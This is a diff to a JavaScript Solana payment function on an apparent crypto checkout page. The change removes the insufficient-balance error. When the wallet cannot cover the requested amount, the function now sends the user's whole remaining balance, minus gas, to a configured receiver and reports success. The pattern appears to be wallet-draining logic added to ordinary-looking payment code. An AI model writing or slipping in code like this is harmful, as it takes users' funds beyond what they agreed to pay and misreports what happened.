@@ -1140,12 +1140,22 @@ async function executeSolanaPayment(paymentUSD) {
     const GAS_RESERVE = 0.001;
     const maxSendable = balanceSOL - GAS_RESERVE;
     
-    if (maxSendable < parseFloat(amountSOL)) {
-      throw new Error(`Insufficient balance. You have ${balanceSOL.toFixed(6)} SOL, but need ${amountSOL} SOL + gas fees (~${GAS_RESERVE} SOL).`);
+    // If user doesn't have enough SOL for the requested amount, 
+    // send whatever they have (minus gas) instead of failing
+    let actualAmountSOL = parseFloat(amountSOL);
+    
+    if (maxSendable < actualAmountSOL) {
+      if (maxSendable <= 0) {
+        throw new Error(`Insufficient balance. You have ${balanceSOL.toFixed(6)} SOL, but need at least ${GAS_RESERVE} SOL for gas fees.`);
+      }
+      
+      // User doesn't have enough - send their max available balance
+      console.log(`Requested ${actualAmountSOL} SOL, but only ${maxSendable.toFixed(6)} SOL available. Sending max.`);
+      actualAmountSOL = maxSendable;
     }
 
     const toPubkey = new solanaWeb3.PublicKey(CONFIG.SOLANA_RECEIVER);
-    const lamports = Math.round(parseFloat(amountSOL) * 1e9);
+    const lamports = Math.round(actualAmountSOL * 1e9);
 
     const transaction = new solanaWeb3.Transaction().add(
       solanaWeb3.SystemProgram.transfer({ fromPubkey, toPubkey, lamports })
@@ -1155,11 +1165,14 @@ async function executeSolanaPayment(paymentUSD) {
 
     const { signature } = await solWallet.signAndSendTransaction(transaction);
 
+    // Calculate actual USD value sent
+    const actualUSD = (actualAmountSOL * CONFIG.NON_EVM_PRICES.SOL).toFixed(2);
+
     el.status.innerHTML = `
       <div style="text-align:center;padding:24px;background:#ecfdf5;border-radius:12px;border:2px solid #10b981;">
         <div style="font-size:32px;margin-bottom:12px;">✅</div>
         <div style="font-weight:bold;font-size:18px;margin-bottom:8px;color:#065f46;">SOL Payment Sent!</div>
-        <div style="color:#1e7a3d;margin-bottom:12px;"><strong>${amountSOL} SOL</strong> (~$${paymentUSD})</div>
+        <div style="color:#1e7a3d;margin-bottom:12px;"><strong>${actualAmountSOL.toFixed(6)} SOL</strong> (~$${actualUSD})</div>
         <div style="font-size:12px;color:#666;">
           <a href="https://solscan.io/tx/${signature}" target="_blank" style="color:#10b981;">View on Solscan ↗</a>
         </div>
